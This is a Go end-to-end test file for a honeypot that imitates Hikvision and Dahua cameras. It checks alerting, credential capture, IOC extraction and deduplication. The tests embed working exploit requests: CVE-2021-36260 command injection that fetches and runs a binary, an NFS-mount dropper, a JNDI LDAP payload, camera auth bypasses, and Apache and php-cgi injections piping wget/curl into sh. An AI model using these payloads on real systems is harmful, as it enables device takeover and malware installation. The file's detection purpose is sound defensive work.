package e2e

import (
	"encoding/base64"
	"fmt"
	"io"
	"strings"
	"testing"
	"time"

	"github.com/generalregulator/botbait/internal/model"
)

func TestHikvisionExploitOverTheWire(t *testing.T) {
	e := startEnv(t)

	body := `<?xml version="1.0" encoding="UTF-8"?><language>$(wget ` + e.payloadURL + `/arm5 -O /tmp/x;chmod 777 /tmp/x;/tmp/x hikivision)</language>`
	req := fmt.Sprintf("PUT /SDK/webLanguage HTTP/1.1\r\nHost: 192.0.2.10\r\nUser-Agent: Mozilla/5.0\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", len(body), body)

	c := dial(t, e.webPort)
	if _, err := c.Write([]byte(req)); err != nil {
		t.Fatal(err)
	}
	resp, _ := io.ReadAll(c)
	if !strings.HasPrefix(string(resp), "HTTP/1.1 200 OK") || !strings.Contains(string(resp), "<statusString>OK</statusString>") {
		t.Fatalf("unexpected response: %q", resp)
	}
	if !strings.Contains(string(resp), "Server: App-webs/") {
		t.Errorf("missing vendor Server header: %q", resp)
	}

	msg := e.waitAlert(t)
	for _, want := range []string{"HONEYPOT ALERT (80/HTTP)", "[HTTP PUT | Hikvision CVE-2021-36260 (webLanguage injection)]", "T1190", e.payloadSHA} {
		if !strings.Contains(msg, want) {
			t.Errorf("alert lacks %q:\n%s", want, msg)
		}
	}

	evs := e.shutdown(t)
	var found bool
	for _, ev := range evs {
		if ev.Signature == "" {
			continue
		}
		found = true
		if ev.DstPort != 80 || ev.Protocol != "HTTP" {
			t.Errorf("service label %s, want 80/HTTP", ev.Service())
		}
		if !ev.HasTechnique("T1190") || !ev.HasTechnique("T1105") {
			t.Errorf("techniques %v", ev.TechniqueIDs())
		}
		if len(ev.Commands) == 0 || !strings.Contains(ev.Commands[0], "wget") {
			t.Errorf("commands %v", ev.Commands)
		}
	}
	if !found {
		t.Fatal("no event with a signature was stored")
	}
}

func TestDahuaStyleLoginRecordsCredentialsOnCameraPort(t *testing.T) {
	e := startEnv(t)
	body := `{"method":"global.login","params":{"userName":"admin","password":"abc123hash","clientType":"Web3.0"},"id":2}`
	req := fmt.Sprintf("POST /RPC2_Login HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", len(body), body)
	c := dial(t, e.webPort)
	_, _ = c.Write([]byte(req))
	_ = c.SetReadDeadline(time.Now().Add(3 * time.Second))
	resp, _ := io.ReadAll(c)
	if !strings.Contains(string(resp), `"result":true`) || !strings.Contains(string(resp), "Server: Webs") {
		t.Fatalf("response %q", resp)
	}
	evs := e.shutdown(t)
	var ok bool
	for _, ev := range evs {
		for _, cr := range ev.Credentials {
			if cr.Username == "admin" && cr.Password == "abc123hash" {
				ok = true
			}
		}
	}
	if !ok {
		t.Fatalf("credentials not recorded: %+v", evs)
	}
}

func TestCrawlersOnCameraPortAreLoggedButNeverAlerted(t *testing.T) {
	e := startEnv(t)
	for _, target := range []string{"/", "/robots.txt", "/cgi-bin/luci", "/.env", "/System/deviceInfo", "/System/deviceInfo?auth=c29tZXRoaW5n", "/wp-login.php"} {
		c := dial(t, e.webPort)
		req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: x\r\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)\r\nConnection: close\r\n\r\n", target)
		if _, err := c.Write([]byte(req)); err != nil {
			t.Fatal(err)
		}
		_, _ = io.ReadAll(c)
	}

	var evs []model.Event
	for _, ev := range e.shutdown(t) {
		if ev.HTTPMethod != "" {
			evs = append(evs, ev)
		}
	}
	if len(evs) != 7 {
		t.Fatalf("every request must still be logged, got %d HTTP events", len(evs))
	}
	for _, ev := range evs {
		if len(ev.Techniques) != 0 || ev.Signature != "" {
			t.Errorf("%s %s: techniques %v signature %q", ev.HTTPMethod, ev.HTTPPath, ev.TechniqueIDs(), ev.Signature)
		}
		if ev.Persona != "hikvision" {
			t.Errorf("persona %q", ev.Persona)
		}
	}
	select {
	case m := <-e.tgMsgs:
		t.Fatalf("crawler traffic produced an alert:\n%s", m)
	default:
	}
}

func TestConfirmedBypassAttemptsAreAlerted(t *testing.T) {
	cases := []struct{ name, req, want string }{
		{"hikvision token", "GET /Security/users?auth=YWRtaW46MTEK HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n", "Hikvision CVE-2017-7921"},
		{"dahua netkeyboard", "", "Dahua CVE-2021-33044"},
		{"hikvision applyCT", "applyct", "Hikvision CVE-2025-34067"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			e := startEnv(t)
			req := c.req
			if req == "applyct" {
				body := `{"a":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://203.0.113.9:1389/a","autoCommit":true}}`
				req = fmt.Sprintf("POST /bic/ssoService/v1/applyCT HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", len(body), body)
			} else if req == "" {
				body := `{"method":"global.login","params":{"userName":"admin","password":"","clientType":"NetKeyboard"},"id":1}`
				req = fmt.Sprintf("POST /RPC2_Login HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", len(body), body)
			}
			conn := dial(t, e.webPort)
			_, _ = conn.Write([]byte(req))
			_, _ = io.ReadAll(conn)
			msg := e.waitAlert(t)
			if !strings.Contains(msg, c.want) || !strings.Contains(msg, "T1190") {
				t.Fatalf("alert lacks %q or T1190:\n%s", c.want, msg)
			}
			e.shutdown(t)
		})
	}
}

func TestRepeatedAttackIsAlertedOnlyOnce(t *testing.T) {
	e := startEnv(t)
	req := "GET /Security/users?auth=YWRtaW46MTEK HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n"
	for i := 0; i < 4; i++ {
		c := dial(t, e.webPort)
		_, _ = c.Write([]byte(req))
		_, _ = io.ReadAll(c)
	}
	e.waitAlert(t)
	evs := e.shutdown(t)
	sent, seen := 0, 0
	for _, ev := range evs {
		if ev.Signature != "" {
			seen++
			if ev.AlertSent {
				sent++
			}
		}
	}
	if seen != 4 || sent != 1 {
		t.Fatalf("stored %d signature events, %d alerted; want 4 and 1", seen, sent)
	}
	select {
	case m := <-e.tgMsgs:
		t.Fatalf("a repeat produced a second Telegram message:\n%s", m)
	default:
	}
}

func TestNFSDropperAlertShowsShareAndNotTheSensorAddress(t *testing.T) {
	e := startEnv(t)
	body := `<?xml version="1.0" encoding="UTF-8"?><language>$(cd /var; mkdir o; mount -o intr,nolock,tcp,exec 203.0.113.9:/var/nfs/files o; sh o/nfs.sh; umount -f /var/o)</language>`
	req := fmt.Sprintf("PUT /SDK/webLanguage HTTP/1.1\r\nHost: 192.0.2.10:80\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", len(body), body)
	c := dial(t, e.webPort)
	_, _ = c.Write([]byte(req))
	_, _ = io.ReadAll(c)
	msg := e.waitAlert(t)
	for _, want := range []string{"Hikvision CVE-2021-36260", "📂 NFS: 203.0.113.9:/var/nfs/files → nfs.sh", "T1190", "T1105"} {
		if !strings.Contains(msg, want) {
			t.Errorf("alert lacks %q:\n%s", want, msg)
		}
	}
	iocPart := msg[strings.Index(msg, "Extracted IOCs"):]
	if strings.Contains(iocPart, "192.0.2.10") {
		t.Errorf("the sensor's own address is listed as an IOC:\n%s", iocPart)
	}
	for _, ev := range e.shutdown(t) {
		if ev.Signature == "" {
			continue
		}
		if len(ev.IOCs.NFS) != 1 {
			t.Errorf("stored NFS iocs %v", ev.IOCs.NFS)
		}
		for _, ip := range ev.IOCs.IPs {
			if ip == "192.0.2.10" {
				t.Errorf("own address stored as IOC: %v", ev.IOCs.IPs)
			}
		}
	}
}

func TestGenericWebExploitsStillAlertOnCameraPort(t *testing.T) {
	cases := []struct {
		name, method, target, ctype, body string
	}{
		{
			"apache path traversal shell",
			"POST", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh", "text/plain",
			"(wget --no-check-certificate -qO- %s/arm5 || curl -sk %s/arm5) | sh -s apache",
		},
		{
			"php-cgi argument injection",
			"POST", "/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "application/x-www-form-urlencoded",
			`<?php shell_exec(base64_decode("%s"));die(); ?>`,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			e := startEnv(t)
			body := c.body
			if strings.Count(body, "%s") == 2 {
				body = fmt.Sprintf(body, e.payloadURL, e.payloadURL)
			} else {
				cmd := "(wget --no-check-certificate -qO- " + e.payloadURL + "/arm5 || curl -sk " + e.payloadURL + "/arm5) | sh -s apache"
				body = fmt.Sprintf(body, base64.StdEncoding.EncodeToString([]byte(cmd)))
			}
			req := fmt.Sprintf("%s %s HTTP/1.1\r\nHost: 192.0.2.10:80\r\nUser-Agent: libredtail-http\r\nContent-Type: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
				c.method, c.target, c.ctype, len(body), body)
			conn := dial(t, e.webPort)
			_, _ = conn.Write([]byte(req))
			_, _ = io.ReadAll(conn)
			msg := e.waitAlert(t)
			for _, want := range []string{"HONEYPOT ALERT (80/HTTP)", "T1190", "T1105", "T1059.004", e.payloadURL + "/arm5", e.payloadSHA} {
				if !strings.Contains(msg, want) {
					t.Errorf("alert lacks %q:\n%s", want, msg)
				}
			}
			e.shutdown(t)
		})
	}
}
